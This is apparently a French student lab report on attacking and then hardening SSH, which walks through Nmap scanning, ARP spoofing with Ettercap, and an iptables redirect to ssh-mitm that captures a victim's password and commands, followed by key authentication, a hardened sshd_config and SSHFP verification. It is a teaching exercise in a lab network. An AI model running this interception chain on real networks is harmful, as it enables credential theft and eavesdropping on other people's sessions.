3
Protocole SSH et modèle TOFU
Qu'est-ce que le modèle TOFU (Trust On First Use) ?

Lors de la première connexion SSH, le client reçoit la clé publique du serveur et demande à l'utilisateur de l'accepter ou non.

Si l'utilisateur accepte sans vérifier → la clé est mémorisée dans ~/.ssh/known_hosts → toutes les connexions suivantes font confiance à cette clé.

Risque : si un attaquant MITM intercepte la première connexion, il peut substituer sa propre clé → l'utilisateur lui fait confiance sans le savoir.

Reconnaissance réseau — Nmap
Pourquoi la reconnaissance est-elle la première étape ?

Avant toute attaque, un attaquant doit cartographier le réseau pour identifier les hôtes actifs, les ports ouverts et les versions de services.

Nmap permet d'obtenir ces informations en quelques secondes — ce qui facilite le ciblage d'un serveur vulnérable.

Figure 1 — Scan réseau avec Nmap (depuis Kali Linux)
Kali Linux — Reconnaissance
# Scan de tout le sous-réseau pour trouver les hôtes actifs
kali# nmap -sn 192.168.1.0/24

# Résultat attendu dans la capture :
Nmap scan report for 192.168.1.10  (Serveur SSH — Debian)
Nmap scan report for 192.168.1.20  (Client SSH — Debian)
Nmap scan report for 192.168.1.1   (Routeur OpenBSD)

# Scanner les ports et versions du serveur SSH ciblé
kali# nmap -sV -p 22 192.168.1.10

# Résultat attendu :
PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 8.x (Debian)
⌨ Commande(s) utilisée(s)
nmap -sn 192.168.1.0/24 / nmap -sV -p 22 <ip>
🧠 Pourquoi ces commandes ?
-sn → scan de découverte sans port scan (ping sweep) pour lister les hôtes actifs.
-sV -p 22 → détecte la version exacte du service SSH pour identifier des vulnérabilités connues.
✅ Résultat attendu
L'attaquant connaît les IP du client et du serveur SSH — il peut maintenant préparer l'attaque ARP Spoofing.
5
Mise en œuvre de l'ARP Spoofing — Ettercap
Qu'est-ce que l'ARP Spoofing ?

Le protocole ARP associe une adresse IP à une adresse MAC sur un réseau local. Il n'y a aucune authentification dans ARP.

L'attaquant envoie de fausses réponses ARP au client et au serveur pour leur faire croire que sa MAC est celle de l'autre.

Résultat : tout le trafic passe par la machine Kali → l'attaquant est au milieu de la communication (Man-in-the-Middle).

Figure 2 — Activation du routage IP et ARP Spoofing avec Ettercap
Kali Linux — ARP Spoofing
# Étape 1 : Activer le routage IP pour ne pas couper la communication
kali# echo 1 > /proc/sys/net/ipv4/ip_forward
# Sans ip_forward, les paquets ne seraient pas retransmis → coupure réseau

# Étape 2 : Lancer l'ARP Spoofing avec Ettercap (mode texte)
kali# ettercap -T -M arp:remote /192.168.1.20/ /192.168.1.10/
# -T    : mode texte (terminal)
# -M arp:remote : attaque MITM par empoisonnement ARP
# /IP1/ : IP du client (victime)
# /IP2/ : IP du serveur SSH (cible)

# Résultat dans la capture :
ARP poisoning victims:
 GROUP 1 : 192.168.1.20 (Client)
 GROUP 2 : 192.168.1.10 (Serveur SSH)
Starting Unified sniffing...
⌨ Commande(s) utilisée(s)
echo 1 > /proc/sys/net/ipv4/ip_forward + ettercap -T -M arp:remote /IP_client/ /IP_serveur/
🧠 Pourquoi ces commandes ?
ip_forward=1 → indispensable : sans ça, les paquets seraient bloqués sur Kali → détection immédiate par coupure réseau.
ettercap -M arp:remote → empoisonne les tables ARP du client ET du serveur simultanément, forçant tout le trafic à transiter par Kali.
✅ Résultat attendu
Tout le trafic entre le client et le serveur SSH passe maintenant par la machine Kali — l'attaquant est au milieu.

Exploitation — Interception SSH avec ssh-mitm
Comment ssh-mitm intercepte-t-il une session chiffrée ?

SSH est chiffré — mais si le client ne vérifie pas l'identité du serveur (modèle TOFU), l'attaquant peut présenter sa propre clé au client.

Le client croit parler au vrai serveur → il envoie son mot de passe → ssh-mitm le capture en clair avant de le transmettre au vrai serveur.

Le serveur ne voit rien d'anormal — la connexion est maintenue.

Figure 3 — Redirection de port et lancement de ssh-mitm
Kali Linux — ssh-mitm
# Rediriger le port SSH vers ssh-mitm (avant qu'il atteigne le vrai serveur)
kali# iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 10022

# Lancer ssh-mitm sur le port 10022
kali# ssh-mitm --listen-port 10022

# Résultat dans la capture quand le client se connecte :
[*] SSH interception started on port 10022
[!] Client connected: 192.168.1.20
[!] Credentials captured:
    Username : admin
    Password : motdepasse123
[*] Forwarding session to real server 192.168.1.10:22
⌨ Commande(s) utilisée(s)
iptables -t nat -A PREROUTING --dport 22 -j REDIRECT --to-port 10022 + ssh-mitm --listen-port 10022
🧠 Pourquoi ces commandes ?
iptables REDIRECT → intercepte les connexions SSH (port 22) et les redirige vers ssh-mitm (port 10022) sur Kali, de façon transparente.
ssh-mitm → agit comme un faux serveur SSH, capture les identifiants en clair, puis retransmet la connexion au vrai serveur.
✅ Résultat attendu
Les identifiants SSH (login + mot de passe) sont capturés en clair dans la console de ssh-mitm — même si SSH est un protocole chiffré.
Figure 4 — Capture des commandes exécutées sur le serveur
ssh-mitm — Session capturée
# Journal ssh-mitm : toutes les commandes tapées par la victime sont visibles
[*] Session established for user: admin
[!] Command captured: ls -la /etc/ssh/
[!] Command captured: cat /etc/passwd
[!] Command captured: sudo reboot

# La victime ne voit rien d'anormal — sa session SSH fonctionne normalement
# Mais l'attaquant voit TOUT : commandes, résultats, fichiers consultés
⌨ Ce qui est capturé
Identifiants + toutes les commandes exécutées sur le serveur distant
🧠 Pourquoi SSH peut-il être compromis malgré le chiffrement ?
SSH chiffre le tunnel — mais si l'identité du serveur n'est pas vérifiée, l'attaquant se glisse entre les deux. Le chiffrement ne protège pas contre le MITM : il protège contre l'écoute passive, pas contre l'usurpation d'identité.
✅ Résultat attendu
Preuves que même un protocole chiffré peut être compromis si l'identité du serveur n'est pas vérifiée par le client.

Contre-mesures — Authentification par clés
Pourquoi les clés cryptographiques remplacent les mots de passe ?

Avec un mot de passe : celui-ci transite sur le réseau (même chiffré) → ssh-mitm peut le capturer au moment de l'authentification.

Avec une clé SSH : aucun secret ne transite — le client prouve son identité avec sa clé privée (jamais envoyée), le serveur vérifie avec la clé publique. Impossible à intercepter.

Figure 5 — Génération et déploiement des clés SSH
Client Debian — Clés SSH
# Sur le client : générer une paire de clés (ED25519 recommandé par ANSSI)
client$ ssh-keygen -t ed25519 -C "chahine@bts-sio"
# Génère : ~/.ssh/id_ed25519 (clé privée) + ~/.ssh/id_ed25519.pub (clé publique)

# Copier la clé publique sur le serveur
client$ ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@192.168.1.10
# La clé publique est ajoutée dans ~/.ssh/authorized_keys sur le serveur

# Vérifier les droits des fichiers (SSH refuse si trop permissifs)
client$ chmod 600 ~/.ssh/id_ed25519
client$ chmod 644 ~/.ssh/id_ed25519.pub

# Connexion sans mot de passe :
client$ ssh -i ~/.ssh/id_ed25519 admin@192.168.1.10
admin@serveur:~$    # Connexion établie sans saisir de mot de passe !
⌨ Commande(s) utilisée(s)
ssh-keygen -t ed25519 / ssh-copy-id / chmod 600
🧠 Pourquoi ed25519 et pas RSA ?
ed25519 est recommandé par l'ANSSI : clé plus courte mais plus sécurisée que RSA 2048. chmod 600 est obligatoire — SSH refuse de fonctionner si la clé privée est lisible par d'autres utilisateurs.
✅ Résultat attendu
La connexion SSH fonctionne sans mot de passe — même si un attaquant intercepte le trafic, il ne peut rien capturer d'utile.

Durcissement sshd_config — Recommandations ANSSI
Figure 6 — Configuration sshd_config durcie
Serveur Debian — /etc/ssh/sshd_config
# Désactiver l'authentification par mot de passe (clés uniquement)
PasswordAuthentication no
ChallengeResponseAuthentication no

# Désactiver la connexion root directe
PermitRootLogin no

# Utiliser uniquement les algorithmes recommandés ANSSI
KexAlgorithms curve25519-sha256,diffie-hellman-group-exchange-sha256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

# Limiter les tentatives et le délai d'authentification
MaxAuthTries 3
LoginGraceTime 30

# Appliquer les changements
server# systemctl restart sshd
PasswordAuthentication no
Pourquoi ? Supprime l'envoi de mots de passe — seule l'authentification par clé est acceptée. Rend l'attaque ssh-mitm inutile : rien à capturer.
PermitRootLogin no
Pourquoi ? Interdit la connexion SSH directe en root — réduit la surface d'attaque. L'attaquant ne peut pas obtenir un accès root immédiat même avec des identifiants volés.
MaxAuthTries 3
Pourquoi ? Limite les tentatives d'authentification — protège contre les attaques par force brute. Après 3 échecs, la connexion est coupée.
KexAlgorithms / Ciphers / MACs
Pourquoi ? Force l'utilisation des algorithmes cryptographiques recommandés par l'ANSSI — désactive les algorithmes obsolètes ou vulnérables (ex : DES, RC4, MD5).

Vérification de l'identité — Mécanisme SSHFP
Qu'est-ce que SSHFP et pourquoi remplace-t-il le TOFU ?

SSHFP (SSH Fingerprint) publie l'empreinte de la clé du serveur SSH dans un enregistrement DNS signé (DNSSEC).

Lors de la connexion, le client vérifie automatiquement l'empreinte du serveur en interrogeant le DNS — sans intervention de l'utilisateur.

Avantage vs TOFU : l'utilisateur n'a plus à accepter manuellement → moins de risque d'accepter une fausse clé MITM.

Figure 7 — Génération et publication des enregistrements SSHFP
Serveur — SSHFP via DNS
# Sur le serveur : générer les enregistrements SSHFP à publier dans le DNS
server# ssh-keygen -r nom-du-serveur

# Résultat : enregistrements à ajouter dans la zone DNS
nom-du-serveur IN SSHFP 4 2 a1b2c3d4e5f6... (ED25519 + SHA-256)
nom-du-serveur IN SSHFP 1 2 f6e5d4c3b2a1... (RSA + SHA-256)

# Sur le client : connexion avec vérification SSHFP automatique
client$ ssh -o VerifyHostKeyDNS=yes admin@nom-du-serveur

# Résultat si l'empreinte correspond :
Matching host key fingerprint found in DNS.
admin@serveur:~$    # Connexion établie — identité vérifiée via DNS

# Résultat si l'empreinte NE correspond PAS (MITM détecté) :
WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
Connection refused — possible MITM attack detected!
⌨ Commande(s) utilisée(s)
ssh-keygen -r <serveur> / ssh -o VerifyHostKeyDNS=yes
🧠 Pourquoi SSHFP améliore-t-il la sécurité ?
Avec TOFU, l'utilisateur peut par erreur accepter la clé d'un attaquant MITM. Avec SSHFP, la vérification est automatique via le DNS — si la clé ne correspond pas, la connexion est refusée sans intervention humaine. Particulièrement utile en environnement professionnel avec de nombreux serveurs.
✅ Résultat attendu
L'empreinte est vérifiée automatiquement → une attaque MITM est détectée et bloquée avant même l'authentification.
